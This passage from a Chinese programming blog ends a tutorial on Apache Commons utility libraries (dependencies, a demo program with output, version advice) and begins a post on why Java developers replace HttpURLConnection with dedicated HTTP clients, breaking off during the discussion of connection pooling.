<li><strong>重用性 (Reusability):</strong> 提供可以在任何 Java 项目中使用的通用组件。</li>
<li><strong>高效性 (Efficiency):</strong> 让你用更少的代码完成更多的工作。</li>
<li><strong>可靠性 (Reliability):</strong> 代码经过了全球大量项目的实战检验，非常稳定。</li>
</ul>
<hr>
<h3 id="1-2-核心组件"><a href="#1-2-核心组件" class="headerlink" title="1.2 核心组件"></a>1.2 核心组件</h3><p>Apache Commons 包含几十个子项目，这里介绍几个最核心、最常用的：</p>
<table>
<thead>
<tr>
<th align="left">组件名</th>
<th align="left">主要功能</th>
<th align="left">常用类</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Commons Lang3</strong></td>
<td align="left">对 Java 语言核心类（<code>java.lang</code>）的增强，尤其是字符串、日期、对象等操作。</td>
<td align="left"><code>StringUtils</code>, <code>ObjectUtils</code>, <code>ArrayUtils</code>, <code>RandomStringUtils</code></td>
</tr>
<tr>
<td align="left"><strong>Commons Collections4</strong></td>
<td align="left">对 Java 集合框架（<code>java.util</code>）的增强，提供更方便的集合操作和新的集合类型。</td>
<td align="left"><code>CollectionUtils</code>, <code>MapUtils</code>, <code>ListUtils</code></td>
</tr>
<tr>
<td align="left"><strong>Commons IO</strong></td>
<td align="left">简化和增强文件及流（I&#x2F;O）操作。</td>
<td align="left"><code>FileUtils</code>, <code>IOUtils</code>, <code>FilenameUtils</code></td>
</tr>
<tr>
<td align="left"><strong>Commons Codec</strong></td>
<td align="left">提供常见的编解码功能，如 Base64, Hex, URL 等。</td>
<td align="left"><code>Base64</code>, <code>DigestUtils</code> (用于MD5&#x2F;SHA)</td>
</tr>
<tr>
<td align="left"><strong>Commons BeanUtils</strong></td>
<td align="left">简化对 JavaBean 的属性操作，常用于对象之间的属性复制。</td>
<td align="left"><code>BeanUtils</code>, <code>PropertyUtils</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="1-3-示例"><a href="#1-3-示例" class="headerlink" title="1.3 示例"></a>1.3 示例</h3><h4 id="第-1-步：添加依赖"><a href="#第-1-步：添加依赖" class="headerlink" title="第 1 步：添加依赖"></a>第 1 步：添加依赖</h4><p>在你的项目中，你需要先声明对 Commons 组件的依赖。我们以最常用的 <strong>Commons Lang3</strong> 和 <strong>Commons IO</strong> 为例。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Commons Lang 依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 建议使用最新稳定版 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Commons IO 依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.15.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 建议使用最新稳定版 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 如果需要集合工具 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 如果需要编解码工具 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.16.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="第-2-步：在代码中使用工具类"><a href="#第-2-步：在代码中使用工具类" class="headerlink" title="第 2 步：在代码中使用工具类"></a>第 2 步：在代码中使用工具类</h4><p>现在，你可以像使用普通类一样，在你的 Java 代码中导入并使用它们了。下面是一些非常经典的例子。</p>
<p>创建一个 Java 文件，比如 <code>CommonsUsageDemo.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsUsageDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--- 1.演示 Commons Lang3 ---&quot;</span>);</span><br><span class="line">        demoStringUtils();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n--- 2.演示 Commons Collections4 ---&quot;</span>);</span><br><span class="line">        demoCollectionUtils();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n--- 3.演示 Commons IO ---&quot;</span>);</span><br><span class="line">        demoFileUtils();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 演示 StringUtils 的常用方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demoStringUtils</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 判断字符串是否为空白（null, &quot;&quot;, &quot;  &quot; 都算空白）</span></span><br><span class="line">        <span class="comment">// 这是最常用的方法之一！</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 &#x27; &#x27; 是否为空白: &quot;</span> + StringUtils.isBlank(<span class="string">&quot;  &quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 &#x27;&#x27; 是否为空白: &quot;</span> + StringUtils.isBlank(<span class="string">&quot;&quot;</span>));   <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 null 是否为空白: &quot;</span> + StringUtils.isBlank(<span class="literal">null</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 &#x27;abc&#x27; 是否为空白: &quot;</span> + StringUtils.isBlank(<span class="string">&quot;abc&quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 判断字符串是否为空（null 或 &quot;&quot;）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 &#x27; &#x27; 是否为空: &quot;</span> + StringUtils.isEmpty(<span class="string">&quot;  &quot;</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 字符串拼接</span></span><br><span class="line">        String[] array = &#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">joinedString</span> <span class="operator">=</span> StringUtils.join(array, <span class="string">&quot;, &quot;</span>); <span class="comment">// 使用 &quot;, &quot; 连接数组元素</span></span><br><span class="line">        System.out.println(<span class="string">&quot;数组拼接结果: &quot;</span> + joinedString); <span class="comment">// a, b, c</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 首字母大写</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">original</span> <span class="operator">=</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">capitalized</span> <span class="operator">=</span> StringUtils.capitalize(original);</span><br><span class="line">        System.out.println(<span class="string">&quot;首字母大写: &quot;</span> + capitalized); <span class="comment">// Hello world</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 比较两个字符串是否相等（null 安全）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;比较 &#x27;a&#x27; 和 &#x27;a&#x27;: &quot;</span> + StringUtils.equals(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;比较 null 和 &#x27;a&#x27;: &quot;</span> + StringUtils.equals(<span class="literal">null</span>, <span class="string">&quot;a&quot;</span>)); <span class="comment">// false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 演示 CollectionUtils 的常用方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demoCollectionUtils</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list1.add(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        list1.add(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; list2 = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 判断集合是否为空（null 或 size=0）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 list1 是否为空: &quot;</span> + CollectionUtils.isEmpty(list1)); <span class="comment">// false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 list2 是否为空: &quot;</span> + CollectionUtils.isEmpty(list2)); <span class="comment">// true</span></span><br><span class="line">        System.out.println(<span class="string">&quot;判断 new ArrayList() 是否为空: &quot;</span> + CollectionUtils.isEmpty(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;())); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// isNotEmpty 是 isEmpty 的反向操作，更直观</span></span><br><span class="line">        <span class="keyword">if</span> (CollectionUtils.isNotEmpty(list1)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;list1 不为空，元素个数: &quot;</span> + list1.size());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 演示 FileUtils 的常用方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demoFileUtils</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 创建一个临时文件用于演示</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">testFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello, Apache Commons IO!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. 将字符串写入文件（一行代码搞定，自动处理流的关闭）</span></span><br><span class="line">        FileUtils.writeStringToFile(testFile, content, StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(<span class="string">&quot;已将内容写入到 &quot;</span> + testFile.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 从文件读取内容到字符串（也是一行代码）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">readFileContent</span> <span class="operator">=</span> FileUtils.readFileToString(testFile, StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(<span class="string">&quot;从文件中读取的内容: &quot;</span> + readFileContent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 复制文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;test_copy.txt&quot;</span>);</span><br><span class="line">        FileUtils.copyFile(testFile, destFile);</span><br><span class="line">        System.out.println(<span class="string">&quot;文件已复制到 &quot;</span> + destFile.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 清理（删除创建的文件）</span></span><br><span class="line">        FileUtils.delete(testFile);</span><br><span class="line">        FileUtils.delete(destFile);</span><br><span class="line">        <span class="comment">// 或者 FileUtils.forceDelete(testFile); // 强制删除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;演示文件已删除。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行结果：</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">--- 1.演示 Commons Lang3 ---</span><br><span class="line">判断 &#x27; &#x27; 是否为空白: true</span><br><span class="line">判断 &#x27;&#x27; 是否为空白: true</span><br><span class="line">判断 null 是否为空白: true</span><br><span class="line">判断 &#x27;abc&#x27; 是否为空白: false</span><br><span class="line">判断 &#x27; &#x27; 是否为空: false</span><br><span class="line">数组拼接结果: a, b, c</span><br><span class="line">首字母大写: Hello world</span><br><span class="line">比较 &#x27;a&#x27; 和 &#x27;a&#x27;: true</span><br><span class="line">比较 null 和 &#x27;a&#x27;: false</span><br><span class="line"></span><br><span class="line">--- 2.演示 Commons Collections4 ---</span><br><span class="line">判断 list1 是否为空: false</span><br><span class="line">判断 list2 是否为空: true</span><br><span class="line">判断 new ArrayList() 是否为空: true</span><br><span class="line">list1 不为空，元素个数: 2</span><br><span class="line"></span><br><span class="line">--- 3.演示 Commons IO ---</span><br><span class="line">已将内容写入到 test.txt</span><br><span class="line">从文件中读取的内容: Hello, Apache Commons IO!</span><br><span class="line">文件已复制到 test_copy.txt</span><br><span class="line">演示文件已删除。</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="1-4-最佳实践和建议"><a href="#1-4-最佳实践和建议" class="headerlink" title="1.4 最佳实践和建议"></a>1.4 最佳实践和建议</h3><ol>
<li><strong>版本选择</strong>：<ul>
<li><code>commons-lang</code> vs <code>commons-lang3</code>：请始终使用 <code>commons-lang3</code>。<code>lang3</code> 是一个全新的重写版本，包名是 <code>org.apache.commons.lang3</code>，与旧版不兼容，但 API 设计更优秀。</li>
<li><code>commons-collections</code> vs <code>commons-collections4</code>：同样，推荐使用 <code>commons-collections4</code>。它支持 Java 5 的泛型，更加类型安全。</li>
</ul>
</li>
<li><strong>按需引入</strong>：不要为了一个小功能而引入一个庞大的依赖库。Commons 项目划分得很细，需要什么功能就引入对应的组件。</li>
<li><strong>优先使用 JDK 新特性</strong>：随着 Java 版本（尤其是 Java 8 及以后）的迭代，JDK 本身也吸收了很多优秀的设计。<ul>
<li>例如，Java 11 的 <code>String</code> 类新增了 <code>isBlank()</code> 方法，功能与 <code>StringUtils.isBlank()</code> 类似。</li>
<li>Java 8 的 Stream API 提供了强大的集合处理能力，在某些场景下比 <code>CollectionUtils</code> 更灵活。</li>
<li><strong>选择原则</strong>：如果你的项目要求高版本的 JDK，并且 JDK 的原生方法能满足需求，优先使用 JDK 原生方法。如果为了兼容低版本 JDK，或者 Commons 提供了更简洁、更强大的功能，那么就用 Commons。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/20/Web%E5%8D%8F%E8%AE%AE%E6%9C%8D%E5%8A%A1%E5%99%A8/HTTP%E5%AE%A2%E6%88%B7%E7%AB%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/20/Web%E5%8D%8F%E8%AE%AE%E6%9C%8D%E5%8A%A1%E5%99%A8/HTTP%E5%AE%A2%E6%88%B7%E7%AB%AF/" class="post-title-link" itemprop="url">HTTP客户端</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-20 13:45:41" itemprop="dateCreated datePublished" datetime="2025-10-20T13:45:41+08:00">2025-10-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-21 11:52:15" itemprop="dateModified" datetime="2025-10-21T11:52:15+08:00">2025-10-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8/" itemprop="url" rel="index"><span itemprop="name">Web协议与服务器</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、序章：为什么我们需要专业的HTTP客户端？"><a href="#一、序章：为什么我们需要专业的HTTP客户端？" class="headerlink" title="一、序章：为什么我们需要专业的HTTP客户端？"></a>一、序章：为什么我们需要专业的HTTP客户端？</h1><h2 id="1-原生-HttpURLConnection-的局限性"><a href="#1-原生-HttpURLConnection-的局限性" class="headerlink" title="1. 原生 HttpURLConnection 的局限性"></a>1. 原生 <code>HttpURLConnection</code> 的局限性</h2><p><code>HttpURLConnection</code> 是Java标准库中提供的基础HTTP请求工具。虽然它无需任何第三方依赖，但在现代后端开发中，它的局限性非常明显，是我们在项目中通常会避免直接使用的主要原因。</p>
<h3 id="1-1-API繁琐，易用性差"><a href="#1-1-API繁琐，易用性差" class="headerlink" title="1.1 API繁琐，易用性差"></a>1.1 API繁琐，易用性差</h3><p><code>HttpURLConnection</code> 的API设计停留在较为早期的Java版本，属于一种过程式、低阶的API，完成一个简单的请求需要编写大量样板代码。</p>
<ul>
<li><strong>配置繁琐</strong>：设置请求方法、请求头、请求体等都需要调用独立的setter方法，缺乏链式调用的流畅性。</li>
<li><strong>流式处理</strong>：发送请求体和读取响应体需要手动处理<code>OutputStream</code>和<code>InputStream</code>，包括字符集编码、流的关闭等，非常不便。</li>
<li><strong>错误处理复杂</strong>：当HTTP状态码为错误码时（如4xx, 5xx），调用<code>getInputStream()</code>会直接抛出<code>IOException</code>。开发者必须捕获异常，然后通过<code>getErrorStream()</code>来获取错误响应体，这增加了逻辑的复杂性。</li>
</ul>
<p><strong>示例：发送一个简单的POST JSON请求</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设有jsonBody字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonBody</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;test\&quot;, \&quot;value\&quot;:1&#125;&quot;</span>;</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 创建URL并打开连接</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://api.example.com/data&quot;</span>);</span><br><span class="line">    connection = (HttpURLConnection) url.openConnection();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 设置请求方法为POST，非常不直观</span></span><br><span class="line">    connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 设置请求头</span></span><br><span class="line">    connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; utf-8&quot;</span>);</span><br><span class="line">    connection.setRequestProperty(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 必须设置DoOutput为true才能发送请求体</span></span><br><span class="line">    connection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 手动写入请求体</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> connection.getOutputStream()) &#123;</span><br><span class="line">        <span class="type">byte</span>[] input = jsonBody.getBytes(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        os.write(input, <span class="number">0</span>, input.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 获取响应码</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">responseCode</span> <span class="operator">=</span> connection.getResponseCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 手动读取响应体（需要区分正常流和错误流）</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> (responseCode &gt;= <span class="number">200</span> &amp;&amp; responseCode &lt; <span class="number">300</span>) ? </span><br><span class="line">                              connection.getInputStream() : </span><br><span class="line">                              connection.getErrorStream();</span><br><span class="line">                              </span><br><span class="line">    <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;utf-8&quot;</span>))) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String responseLine;</span><br><span class="line">        <span class="keyword">while</span> ((responseLine = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.append(responseLine.trim());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Response: &quot;</span> + response.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 8. 必须手动断开连接</span></span><br><span class="line">        connection.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对比之下，现代客户端如OkHttp或Spring的<code>RestTemplate</code>&#x2F;<code>WebClient</code>完成同样任务通常只需要几行代码。</p>
<hr>
<h3 id="1-2-默认不支持连接池，性能低下"><a href="#1-2-默认不支持连接池，性能低下" class="headerlink" title="1.2 默认不支持连接池，性能低下"></a>1.2 默认不支持连接池，性能低下</h3><p>HTTP请求的性能开销主要集中在网络连接的建立过程，尤其是对于HTTPS请求，其TCP三次握手和TLS&#x2F;SSL握手非常耗时。连接池技术通过复用已建立的连接，可以极大地提升HTTP客户端的性能。</p>
<ul>
<li><strong>无显式连接池</strong>：<code>HttpURLConnection</code> 本身没有提供一个像Apache HttpClient或OkHttp那样功能完善、易于配置的连接池API。</li>
<li><strong>隐式Keep-Alive</strong>：虽然JVM底层通过系统属性（如 <code>http.keepAlive</code>, <code>http.maxConnections</code>）实现了一定程度的连接复用（HTTP Keep-Alive），但这种机制是全局的、隐式的，并且难以针对不同业务场景进行精细化配置（如单个主机的最大连接数、连接的存活时间、空闲连接回收策略等）。</li>
